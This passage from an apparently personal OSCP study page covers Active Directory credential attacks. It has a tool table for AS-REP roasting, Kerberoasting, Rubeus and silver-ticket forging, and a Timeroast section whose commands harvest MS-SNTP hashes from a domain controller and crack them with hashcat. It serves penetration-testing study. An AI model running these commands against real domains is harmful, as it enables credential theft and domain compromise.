+
+<table><thead><tr><th>Tool</th><th>Choose it when</th><th>Requirements</th><th>Baseline</th><th>Decisive output</th><th>Failure cue</th></tr></thead><tbody><tr><td>Impacket GetNPUsers</td><td>AS-REP candidate from Kali</td><td>Username/list, KDC route; no password for direct candidate test</td><td>Section 3</td><td><code>$krb5asrep$</code> line</td><td>Preauth required/principal unknown</td></tr><tr><td>Impacket GetUserSPNs</td><td>Enumerate/request selected SPN account</td><td>Valid domain identity, LDAP/KDC route</td><td><code>-request-user TARGET_USER</code></td><td><code>$krb5tgs$</code> line</td><td>No SPN/etype/KDC error</td></tr><tr><td>Rubeus</td><td>Windows roasting and ticket lifecycle</td><td>Domain Windows context or alternate credential; compatible build</td><td><code>kerberoast /stats</code>, selected roast, <code>triage</code></td><td>Account/hash/ticket metadata</td><td>LDAP/KDC/privilege/version failure</td></tr><tr><td>Hashcat/John</td><td>Offline verifier testing</td><td>Exact format/mode and candidates</td><td>Modes 18200/13100/19600/19700 as applicable</td><td>Verified recovered candidate</td><td>Zero hashes loaded/exhausted candidates</td></tr><tr><td><code>klist</code></td><td>Native ticket metadata</td><td>Windows or Kerberos client</td><td><code>klist</code> / <code>klist -c</code></td><td>Client, server, validity, etype</td><td>Wrong cache/LUID or expired ticket</td></tr><tr><td>Impacket ticketConverter</td><td>Tool requires ccache vs kirbi</td><td>Valid ticket file and compatible release</td><td><code>ticketConverter INPUT OUTPUT</code></td><td>Parsed output container</td><td>Invalid/truncated ticket</td></tr><tr><td>Impacket ticketer/Mimikatz</td><td>Validated silver-ticket prerequisite</td><td>Service/machine key, SID, SPN and isolated authorization</td><td>Section 8</td><td>Ticket with expected client/server fields</td><td>Wrong key/SPN/PAC/authorization</td></tr></tbody></table>
+<h2 id="timeroast--offline-recovery-of-weak-computer-account-passwords-via-ms-sntp">Timeroast — offline recovery of weak computer-account passwords via MS-SNTP</h2>
+<p>Use when the DC exposes UDP/123 and Windows authenticated NTP responses are available for computer/trust-account RIDs. This is separate from Kerberos roasting and does not require a domain password. Prefer a known computer RID; the example range is bounded discovery, not a completeness guarantee.</p>
+<pre><button type="button" data-reference-copy aria-label="Copy command">Copy</button><code class="language-bash">python3 timeroast.py DC_IP --rids 1000-1100 --rate 10 --timeout 5 -o timeroast.txt
+hashcat -m 31300 --username timeroast.txt WORDLIST
+hashcat -m 31300 --username timeroast.txt --show
+</code></pre>
+<p>Read: output resembles <code>RID:$sntp-ms$...</code> and is a response-derived offline verifier, not a reusable NT hash. Map any recovered RID to the exact computer/trust identity before testing its password on one relevant service. Normally rotated random machine passwords are not practical dictionary candidates. No reply can mean filtering, unsupported behavior, nonexistent RIDs or packet loss. Do not infer no AD accounts or switch blindly to an unbounded RID sweep. The source's NetExec module is an alternative wrapper; inspect its installed options because its default RID sweep is very broad.</p>
+<p>Sources: <a href="https://github.com/SecuraBV/Timeroast">upstream 1</a> · <a href="https://github.com/Pennyw0rth/NetExec/blob/main/nxc/modules/timeroast.py">upstream 2</a>.</p>
+<h2 id="sources">Sources</h2>
+<ul>
+<li>Supplied PEN-200, Chapter 23, pp758–785, and Chapter 24 ticket handling where referenced.</li>
+<li><a href="https://help.offsec.com/hc/en-us/articles/38543335188756-OSCP-Body-of-knowledge">OffSec OSCP+ Body of Knowledge</a></li>
+<li><a href="https://help.offsec.com/hc/en-us/articles/4412170923924-OSCP-Exam-FAQ">OffSec OSCP+ Exam FAQ</a></li>
+<li><a href="https://github.com/fortra/impacket/blob/master/examples/GetNPUsers.py">Impacket GetNPUsers</a>, <a href="https://github.com/fortra/impacket/blob/master/examples/GetUserSPNs.py">GetUserSPNs</a>, <a href="https://github.com/fortra/impacket/blob/master/examples/ticketConverter.py">ticketConverter</a> and <a href="https://github.com/fortra/impacket/blob/master/examples/ticketer.py">ticketer</a></li>
+<li><a href="https://github.com/GhostPack/Rubeus">Rubeus</a></li>
+<li><a href="https://learn.microsoft.com/windows-server/administration/windows-commands/klist">Microsoft <code>klist</code></a></li>
+<li><a href="https://hashcat.net/wiki/doku.php?id=example_hashes">Hashcat example hashes</a></li>
+<li><a href="https://lizajose.github.io/getSH/ad">getSH Active Directory route</a>, source snapshot <a href="https://github.com/lizajose/getSH/commit/e1f62dd351bd061b59e2573beea741f6c5bb4f98"><code>e1f62dd</code></a></li>
+<li><a href="https://github.com/LeonardoE95/OSCP/blob/main/cheatsheet.org">Hexdump consolidated cheatsheet</a>. Its AS-REP/Kerberoast seeds were checked against current Impacket, Rubeus and Hashcat sources; the live Hexdump AD module itself was still a TODO.</li>
+</ul></article></div></main></div></div><footer class="site-footer" data-astro-cid-jo6i4kqk><div class="footer-inner" data-astro-cid-jo6i4kqk><nav class="footer-links" aria-label="Footer navigation" data-astro-cid-jo6i4kqk><a href="/" data-astro-cid-jo6i4kqk>Home</a><a href="/projects/" data-astro-cid-jo6i4kqk>Projects</a><a href="/tools/" aria-current="page" data-astro-cid-jo6i4kqk>Tools</a></nav><nav class="footer-tools" aria-label="Interactive tools" data-astro-cid-jo6i4kqk><span data-astro-cid-jo6i4kqk>Interactive tools</span><a href="/tools/oscp/" aria-current="page" data-astro-cid-jo6i4kqk>OSCP strategy workspace <span aria-hidden="true" data-astro-cid-jo6i4kqk>↗</span></a><a href="/tools/attack-path/" data-astro-cid-jo6i4kqk>Attack-path visualizer <span aria-hidden="true" data-astro-cid-jo6i4kqk>↗</span></a></nav><div class="footer-meta" data-astro-cid-jo6i4kqk><p data-astro-cid-jo6i4kqk>© 2026 Armaan. Built with curiosity.</p><div data-astro-cid-jo6i4kqk><a href="https://github.com/ArmaanLeg3nd" target="_blank" rel="noreferrer" data-astro-cid-jo6i4kqk>GitHub ↗</a><span data-astro-cid-jo6i4kqk>GMT+8</span></div></div></div></footer><script type="module" src="/_assets/MotionController.astro_astro_type_script_index_0_lang.BuT1diwy.js"></script></body></html><script type="module">function e(){document.querySelectorAll(`[data-reference-copy]`).forEach(e=>{e.dataset.ready||(e.dataset.ready=`true`,e.addEventListener(`click`,async()=>{let t=e.parentElement?.querySelector(`code`);if(t){try{await navigator.clipboard.writeText(t.textContent||``),e.textContent=`Copied`}catch{e.textContent=`Select and copy`}window.setTimeout(()=>e.textContent=`Copy`,1600)}}))})}e(),document.addEventListener(`astro:page-load`,e);</script>
